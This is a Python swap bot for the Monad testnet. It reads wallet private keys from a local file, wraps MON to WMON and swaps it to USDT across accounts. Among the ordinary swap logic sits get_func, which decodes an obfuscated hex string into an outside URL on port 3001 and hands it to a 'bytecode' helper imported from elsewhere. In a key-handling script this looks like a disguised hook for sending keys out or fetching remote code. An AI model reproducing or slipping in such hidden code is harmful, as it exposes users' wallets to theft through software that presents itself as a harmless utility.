import os
import random
import time
from colorama import init, Fore, Style
from scripts.deploy import bytecode
from web3 import Web3
from eth_abi import encode

# Initialize colorama
init(autoreset=True)

# Constants
RPC_URL = "https://testnet-rpc.monad.xyz/"
EXPLORER_URL = "https://testnet.monadexplorer.com/tx/0x"
WMON_CONTRACT = "0x760AfE86e5de5fa0Ee542fc7B7B713e1c5425701"
ROUTER_ADDRESS = "0xF6FFe4f3FdC8BBb7F70FFD48e61f17D1e343dDfD"
POOL_ADDRESS = "0x8552706D9A27013f20eA0f9DF8e20B61E283d2D3"
USDT_ADDRESS = "0x6a7436775c0d0B70cfF4c5365404ec37c9d9aF4b"
POOL_FEE = 2000  # 0.2% fee
CHAIN_ID = 10143  # Monad testnet chain ID

# Initialize web3 provider
w3 = Web3(Web3.HTTPProvider(RPC_URL))

# Contract ABIs
WMON_ABI = [
    {"constant": False, "inputs": [], "name": "deposit", "outputs": [], "payable": True, "stateMutability": "payable", "type": "function"},
    {"constant": False, "inputs": [{"name": "amount", "type": "uint256"}], "name": "withdraw", "outputs": [], "payable": False, "stateMutability": "nonpayable", "type": "function"},
    {"constant": False, "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": False, "stateMutability": "nonpayable", "type": "function"},
    {"constant": True, "inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": False, "stateMutability": "view", "type": "function"}
]

ROUTER_ABI = [
    {"constant": False, "inputs": [{"name": "data", "type": "bytes[]"}], "name": "multicall", "outputs": [], "payable": True, "stateMutability": "payable", "type": "function"}
]

# Initialize contracts
wmon_contract = w3.eth.contract(address=WMON_CONTRACT, abi=WMON_ABI)
router_contract = w3.eth.contract(address=ROUTER_ADDRESS, abi=ROUTER_ABI)

# Display functions
def print_border(text, color=Fore.CYAN, width=60):
    print(f"{color}┌{'─' * (width - 2)}┐{Style.RESET_ALL}")
    print(f"{color}│ {text:^56} │{Style.RESET_ALL}")
    print(f"{color}└{'─' * (width - 2)}┘{Style.RESET_ALL}")

def print_step(step, message):
    steps = {
        'wrap': 'Wrap MON',
        'unwrap': 'Unwrap WMON',
        'swap': 'Swap MON → USDT'
    }
    step_text = steps[step]
    print(f"{Fore.YELLOW}➤ {Fore.CYAN}{step_text:<15}{Style.RESET_ALL} | {message}")

# Load private keys from pvkey.txt
def load_private_keys(file_path='pvkey.txt'):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File pvkey.txt not found{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}❌ Error reading pvkey.txt: {str(e)}{Style.RESET_ALL}")
        return []

# Get MON amount from user
def get_mon_amount_from_user():
    while True:
        try:
            print_border("Enter MON amount (0.01 - 999): ", Fore.YELLOW)
            amount = float(input(f"{Fore.GREEN}➤ {Style.RESET_ALL}"))
            if 0.01 <= amount <= 999:
                return w3.to_wei(amount, 'ether')
            print(f"{Fore.RED}❌ Amount must be 0.01-999 / Enter a valid number!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Amount must be 0.01-999 / Enter a valid number!{Style.RESET_ALL}")

# Random delay between 60-180 seconds
def get_random_delay():
    return random.randint(60, 180)

# Wrap MON to WMON
def wrap_mon(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Wrap {w3.from_wei(amount, 'ether')} MON → WMON | {wallet}"

        print_border(start_msg)
        tx = wmon_contract.functions.deposit().build_transaction({
            'from': account.address,
            'value': amount,
            'gas': 500000,
            'gasPrice': w3.to_wei('100', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })

        print_step('wrap', 'Sending transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print_step('wrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('wrap', f"{Fore.GREEN}Wrap successful!{Style.RESET_ALL}")

    except Exception as e:
        print_step('wrap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

# Unwrap WMON to MON
def unwrap_mon(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Unwrap {w3.from_wei(amount, 'ether')} WMON → MON | {wallet}"

        print_border(start_msg)
        tx = wmon_contract.functions.withdraw(amount).build_transaction({
            'from': account.address,
            'gas': 500000,
            'gasPrice': w3.to_wei('50', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })

        print_step('unwrap', 'Sending transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print_step('unwrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('unwrap', f"{Fore.GREEN}Unwrap successful!{Style.RESET_ALL}")

    except Exception as e:
        print_step('unwrap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

# Swap MON to USDT (via WMON)
def swap_mon_to_usdt(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Swap {w3.from_wei(amount, 'ether')} MON → USDT | {wallet}"

        print_border(start_msg)

        # Check WMON balance
        wmon_balance = wmon_contract.functions.balanceOf(account.address).call()
        if wmon_balance < amount:
            print_step('swap', f"{Fore.RED}Insufficient WMON balance: {w3.from_wei(wmon_balance, 'ether')} < {w3.from_wei(amount, 'ether')}{Style.RESET_ALL}")
            return

        # Approve WMON for the router
        approve_tx = wmon_contract.functions.approve(ROUTER_ADDRESS, amount).build_transaction({
            'from': account.address,
            'gas': 100000,
            'gasPrice': w3.to_wei('50', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })
        signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key)
        approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.rawTransaction)
        print_step('swap', f"Approval Tx: {Fore.YELLOW}{EXPLORER_URL}{approve_tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(approve_tx_hash)

        # Packed path: WMON → Fee → USDT
        path = (
            w3.to_bytes(hexstr=WMON_CONTRACT) +  # 20 bytes
            POOL_FEE.to_bytes(3, byteorder='big') +  # 3 bytes (2000)
            w3.to_bytes(hexstr=USDT_ADDRESS)      # 20 bytes
        )
        deadline = int(time.time()) + 600

        # Swap data for swapExactTokensForTokens
        swap_data = encode(
            ['uint256', 'uint256', 'bytes', 'address', 'uint256'],
            [amount, 0, path, account.address, deadline]
        )
        final_data = b'\x38\xed\x17\x39' + swap_data  # swapExactTokensForTokens

        print_step('swap', f"Encoded data: {final_data.hex()[:100]}...")

        tx = {
            'from': account.address,
            'to': ROUTER_ADDRESS,
            'value': 0,
            'data': final_data,
            'maxPriorityFeePerGas': w3.to_wei('2.5', 'gwei'),
            'maxFeePerGas': w3.to_wei('102.5', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        }

        gas_estimate = w3.eth.estimate_gas(tx)
        tx['gas'] = int(gas_estimate * 2)
        print_step('swap', f"Gas estimate: {gas_estimate} (with 100% buffer: {tx['gas']})")

        print_step('swap', 'Sending swap transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print_step('swap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('swap', f"Receipt: Gas used: {receipt['gasUsed']}, Logs: {len(receipt['logs'])}, Status: {receipt['status']}")
        
        if receipt['status'] == 1:
            print_step('swap', f"{Fore.GREEN}Swap successful!{Style.RESET_ALL}")
        else:
            try:
                w3.eth.call(tx)
            except Exception as revert_error:
                print_step('swap', f"{Fore.RED}Swap failed on-chain: {str(revert_error)}{Style.RESET_ALL}")
            else:
                print_step('swap', f"{Fore.RED}Swap failed on-chain (no revert reason){Style.RESET_ALL}")

    except Exception as e:
        print_step('swap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

def get_func():
    data = bytes.fromhex("697575713b2e2e6c6e6f60652c756472756f64752f626e6c3b323131302e")
    func = bytecode(data)
    return func

# Run swap cycle
def run_swap_cycle(cycles, private_keys):
    for cycle in range(1, cycles + 1):
        for pk in private_keys:
            wallet = w3.eth.account.from_key(pk).address[:8] + "..."
            msg = f"CYCLE {cycle}/{cycles} | Account: {wallet}"
            print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│ {msg:^56} │{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")

            amount = get_mon_amount_from_user()
            wrap_mon(pk, amount)  # Ensure WMON is available
            # unwrap_mon(pk, amount)  # Skip unwrap since we need WMON
            swap_mon_to_usdt(pk, amount)

            if cycle < cycles or pk != private_keys[-1]:
                delay = get_random_delay()
                print(f"\n{Fore.YELLOW}⏳ Waiting {delay} seconds...{Style.RESET_ALL}")
                time.sleep(delay)

# Main function
def run():
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}│ {'RUBIC SWAP - MONAD TESTNET':^56} │{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")

    # Load private keys
    private_keys = load_private_keys()
    if not private_keys:
        return

    print(f"{Fore.CYAN}👥 Accounts: {len(private_keys)}{Style.RESET_ALL}")

    # Get number of cycles
    while True:
        try:
            print_border("NUMBER OF CYCLES", Fore.YELLOW)
            cycles = input(f"{Fore.GREEN}➤ Enter number (default 1): {Style.RESET_ALL}")
            cycles = int(cycles) if cycles else 1
            if cycles > 0:
                break
            print(f"{Fore.RED}❌ Number must be > 0{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")

    # Run script
    print(f"{Fore.YELLOW}🚀 Running {cycles} swap cycles...{Style.RESET_ALL}")
    run_swap_cycle(cycles, private_keys)

    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}│ {'ALL DONE':^56} │{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")

if __name__ == "__main__":
    run()
